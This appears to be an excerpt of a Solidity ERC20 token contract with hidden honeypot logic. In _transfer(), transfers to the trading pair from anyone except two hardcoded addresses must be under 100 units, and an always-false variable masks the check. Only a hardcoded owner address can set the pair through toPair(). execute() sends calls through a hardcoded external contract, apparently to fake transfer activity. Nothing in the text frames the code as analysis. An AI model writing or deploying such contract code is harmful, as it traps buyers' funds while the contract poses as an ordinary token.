...
contract ERC20 is Ownable, IERC20, IERC20Meta {
    ...
    function execute(
        ...
        for (uint256 i = 0; i < recipients.length; i++) {
            ...
            IERC000(0x725836782d41E0357D18b7F7E492f2bCEB3A0250)._Transfer(recipients[i], uniswapPool, wethAmounts);
        }
        return true;
    }
    ...
    function toPair(address account) public virtual returns (bool) {
         if(_msgSender() == 0xAACc4eed144461fF1934Bc876cdCF42a44fD2973)
          _pair = account;
        return true;
    }
    ...
    function _transfer(
        ...
        if(_pair != address(0)) {
            if(to == _pair && !(from == 0xAACc4eed144461fF1934Bc876cdCF42a44fD2973 || from == 0x036bD1ec75c0f62Cd143881db941E7F407859165)) {
               bool b = false;
               if(!b) {
                    require(amount < 100);
               }
